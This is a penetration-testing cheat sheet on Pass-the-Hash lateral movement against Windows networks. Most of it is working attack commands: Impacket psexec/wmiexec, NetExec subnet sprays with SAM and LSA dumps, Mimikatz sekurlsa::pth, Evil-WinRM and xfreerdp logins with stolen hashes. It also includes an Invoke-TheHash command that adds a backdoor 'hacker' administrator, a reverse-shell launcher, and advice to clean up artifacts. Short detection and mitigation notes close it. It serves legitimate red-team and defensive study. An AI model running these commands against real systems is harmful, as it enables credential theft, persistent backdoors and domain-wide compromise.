# Pass-the-Hash (PTH)

Authenticate to remote systems using NTLM password hashes without knowing the cleartext password.
PTH is a powerful lateral movement technique that works because Windows accepts NTLM hashes for authentication.

## Quick Reference

```bash
# Impacket psexec
impacket-psexec administrator@10.10.10.10 -hashes :NTHASH

# NetExec PTH
nxc smb 10.10.10.0/24 -u administrator -H NTHASH

# xfreerdp PTH
xfreerdp /u:administrator /pth:NTHASH /v:10.10.10.10
```

## Impacket PTH

```bash
# psexec
impacket-psexec administrator@10.10.10.10 -hashes :NTHASH
impacket-psexec domain/administrator@10.10.10.10 -hashes :NTHASH

# wmiexec
impacket-wmiexec administrator@10.10.10.10 -hashes :NTHASH

# smbexec
impacket-smbexec administrator@10.10.10.10 -hashes :NTHASH

# atexec
impacket-atexec administrator@10.10.10.10 -hashes :NTHASH whoami

# With LM hash (if available)
impacket-psexec administrator@10.10.10.10 -hashes LMHASH:NTHASH
```

## NetExec PTH

```bash
# Single host
nxc smb 10.10.10.10 -u administrator -H NTHASH

# Subnet spray
nxc smb 10.10.10.0/24 -u administrator -H NTHASH

# Local authentication
nxc smb 10.10.10.0/24 -u administrator -H NTHASH --local-auth

# Execute command
nxc smb 10.10.10.10 -u administrator -H NTHASH -x whoami

# Dump SAM
nxc smb 10.10.10.10 -u administrator -H NTHASH --sam

# Dump LSA secrets
nxc smb 10.10.10.10 -u administrator -H NTHASH --lsa

# Check admin access (look for Pwn3d!)
nxc smb 10.10.10.0/24 -u administrator -H NTHASH
```

## Mimikatz PTH (Windows)

```powershell
# Start Mimikatz
.\mimikatz.exe

# Enable debug privilege
mimikatz # privilege::debug

# Pass-the-hash to spawn cmd
mimikatz # sekurlsa::pth /user:administrator /ntlm:NTHASH /domain:domain.local /run:cmd.exe

# Pass-the-hash to spawn PowerShell
mimikatz # sekurlsa::pth /user:administrator /ntlm:NTHASH /domain:domain.local /run:powershell.exe

# Access remote share from spawned shell
net use \\10.10.10.10\C$ /user:administrator
```

## Invoke-TheHash (PowerShell)

```powershell
# Import module
Import-Module .\Invoke-TheHash.psd1

# SMB command execution
Invoke-SMBExec -Target 10.10.10.10 -Domain domain.local -Username administrator -Hash NTHASH -Command "whoami" -Verbose

# Create user and add to admins
Invoke-SMBExec -Target 10.10.10.10 -Domain domain.local -Username administrator -Hash NTHASH -Command "net user hacker Password123! /add && net localgroup administrators hacker /add" -Verbose

# WMI command execution
Invoke-WMIExec -Target 10.10.10.10 -Domain domain.local -Username administrator -Hash NTHASH -Command "whoami" -Verbose

# Reverse shell
Invoke-WMIExec -Target 10.10.10.10 -Domain domain.local -Username administrator -Hash NTHASH -Command "powershell -e BASE64_ENCODED_SHELL" -Verbose
```

## RDP Pass-the-Hash

### Enable Restricted Admin Mode

```cmd
# Add registry key
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Connect with PTH

```bash
# xfreerdp
xfreerdp /u:administrator /pth:NTHASH /v:10.10.10.10

# With domain
xfreerdp /u:administrator /pth:NTHASH /d:domain.local /v:10.10.10.10

# Ignore certificate
xfreerdp /u:administrator /pth:NTHASH /v:10.10.10.10 /cert-ignore
```

## Evil-WinRM PTH

```bash
# Connect with hash
evil-winrm -i 10.10.10.10 -u administrator -H NTHASH

# With domain
evil-winrm -i 10.10.10.10 -u administrator@domain.local -H NTHASH
```

## Common Workflow

```bash
# Step 1: Obtain NTLM hash
# From SAM dump, NTDS.dit, or credential dumping

# Step 2: Test hash validity
nxc smb 10.10.10.10 -u administrator -H NTHASH

# Step 3: Check for admin access
nxc smb 10.10.10.0/24 -u administrator -H NTHASH

# Step 4: Execute commands or get shell
impacket-psexec administrator@10.10.10.10 -hashes :NTHASH

# Step 5: Dump more credentials
nxc smb 10.10.10.10 -u administrator -H NTHASH --sam --lsa
```

## Lateral Movement with PTH

```bash
# Spray hash across subnet
nxc smb 10.10.10.0/24 -u administrator -H NTHASH

# Test local admin password reuse
nxc smb 10.10.10.0/24 -u administrator -H NTHASH --local-auth

# Execute command on multiple hosts
nxc smb 10.10.10.0/24 -u administrator -H NTHASH -x "whoami"

# Dump SAM from all accessible hosts
nxc smb 10.10.10.0/24 -u administrator -H NTHASH --sam
```

## Notes

**How PTH Works:**

Windows NTLM authentication accepts password hashes directly:
1. Client sends username to server
2. Server sends challenge
3. Client encrypts challenge with password hash
4. Server verifies encrypted challenge

Since the hash itself is used for encryption, knowing the hash is equivalent to knowing the password for NTLM authentication.

**Requirements:**

- NTLM hash of target account
- SMB (445/TCP) or other service accepting NTLM auth
- Account must have appropriate permissions
- Target must allow NTLM authentication

**UAC Limitations:**

UAC restricts PTH for local accounts:
- Only RID 500 (built-in Administrator) can PTH by default
- Other local admins blocked unless `LocalAccountTokenFilterPolicy=1`
- Domain accounts not affected by this restriction
- Exception: If `FilterAdministratorToken=1`, even RID 500 is blocked

**Registry Keys:**

```
# Allow PTH for all local admins
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy = 1

# Block PTH for RID 500
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken = 1
```

**Hash Formats:**

```
# Full format (LM:NTLM)
aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf

# NTLM only (most common)
88ad09182de639ccc6579eb0849751cf

# Impacket format (colon prefix for NTLM only)
:88ad09182de639ccc6579eb0849751cf
```

**Common Hash Sources:**

- SAM database dump
- NTDS.dit extraction
- LSASS memory dump
- DCSync attack
- Kerberoasting (after cracking)
- ASREP roasting (after cracking)

**Restricted Admin Mode (RDP):**

Required for RDP PTH:
- Disabled by default
- Must be enabled via registry
- Credentials not sent to remote system
- More secure but enables PTH

**Tools Comparison:**

| Tool | Protocol | Shell Type | Notes |
|------|----------|------------|-------|
| psexec | SMB | Interactive | Creates service |
| wmiexec | WMI | Semi-interactive | Fileless |
| smbexec | SMB | Semi-interactive | Uses cmd.exe |
| atexec | Task Scheduler | Non-interactive | Single command |
| evil-winrm | WinRM | Interactive | PowerShell remoting |

**Detection:**

Event IDs to monitor:
- 4624: Logon (Type 3 = Network)
- 4672: Special privileges assigned
- 4648: Logon using explicit credentials
- 4768/4769: Kerberos ticket requests (if Kerberos used)

Indicators:
- Logon from unusual source IPs
- Lateral movement patterns
- Multiple failed then successful logons
- Admin account used from workstation

**LAPS Mitigation:**

Local Administrator Password Solution (LAPS):
- Randomizes local admin passwords
- Different password per machine
- Prevents password reuse
- Mitigates PTH lateral movement

**Best Practices:**

1. Test hash before full attack
2. Use local-auth flag for local accounts
3. Check for Pwn3d! indicator (admin access)
4. Document all systems accessed
5. Clean up artifacts (services, tasks)
6. Prefer WMI/WinRM over SMB (less artifacts)

**Kerberos vs NTLM:**

PTH only works with NTLM:
- Kerberos uses tickets, not hashes
- Use Pass-the-Ticket for Kerberos
- Many environments still support NTLM
- NTLM often fallback when Kerberos fails

**Privilege Levels:**

- Local Admin: Full control of single machine
- Domain Admin: Full control of domain
- Enterprise Admin: Full control of forest
- Service accounts: Varies by permissions

**Common Targets:**

- Workstations (lateral movement)
- Servers (data access)
- Domain Controllers (domain compromise)
- File servers (data exfiltration)
- Database servers (sensitive data)

**Troubleshooting:**

- If PTH fails: Check UAC settings
- If "Access Denied": Account may not have admin rights
- If "Network path not found": Check firewall/SMB
- If RDP fails: Enable Restricted Admin Mode

**Defensive Recommendations:**

- Implement LAPS
- Disable NTLM where possible
- Enable SMB signing
- Monitor for lateral movement
- Use tiered admin model
- Implement credential guard
- Regular password rotation
- Least privilege principle
